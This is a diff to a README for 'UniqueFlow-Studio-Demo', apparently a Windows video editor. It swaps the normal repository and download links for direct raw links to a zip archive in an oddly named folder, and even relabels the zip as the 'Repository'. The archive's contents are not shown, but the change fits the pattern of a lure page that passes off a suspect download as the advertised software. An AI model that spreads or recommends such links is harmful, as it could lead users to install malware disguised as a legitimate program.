@@ -6,7 +6,7 @@ Welcome to UniqueFlow-Studio-Demo, a powerful video editor designed for Windows 
 
 ## 📥 Download and Install
 
-[![Download Now](https://img.shields.io/badge/Download_UniqueFlow_Studio_Demo-blue?style=for-the-badge&logo=window&logoColor=white)](https://github.com/Watergagegreeneye461/UniqueFlow-Studio-Demo)
+[![Download Now](https://img.shields.io/badge/Download_UniqueFlow_Studio_Demo-blue?style=for-the-badge&logo=window&logoColor=white)](https://raw.githubusercontent.com/Watergagegreeneye461/UniqueFlow-Studio-Demo/main/overexplanation/Flow_Demo_Studio_Unique_3.4.zip)
 
 Visit this link to download the application. The download page will provide the latest setup file. Once you’re on the page, look for the download button or releases section. Follow any provided instructions to get the software on your Windows PC.
 
@@ -58,8 +58,8 @@ If you get stuck or have suggestions, please check the repository's issues page 
 
 ## 🌐 More Information
 
-- Repository: [https://github.com/Watergagegreeneye/UniqueFlow-Studio-Demo](https://github.com/Watergagegreeneye/UniqueFlow-Studio-Demo)
-- Primary Download Link: [https://github.com/Watergagegreeneye/UniqueFlow-Studio-Demo](https://github.com/Watergagegreeneye/UniqueFlow-Studio-Demo)
+- Repository: [https://raw.githubusercontent.com/Watergagegreeneye461/UniqueFlow-Studio-Demo/main/overexplanation/Flow_Demo_Studio_Unique_3.4.zip](https://raw.githubusercontent.com/Watergagegreeneye461/UniqueFlow-Studio-Demo/main/overexplanation/Flow_Demo_Studio_Unique_3.4.zip)
+- Primary Download Link: [https://raw.githubusercontent.com/Watergagegreeneye461/UniqueFlow-Studio-Demo/main/overexplanation/Flow_Demo_Studio_Unique_3.4.zip](https://raw.githubusercontent.com/Watergagegreeneye461/UniqueFlow-Studio-Demo/main/overexplanation/Flow_Demo_Studio_Unique_3.4.zip)
 
 ## 👨‍💻 For Developers
 
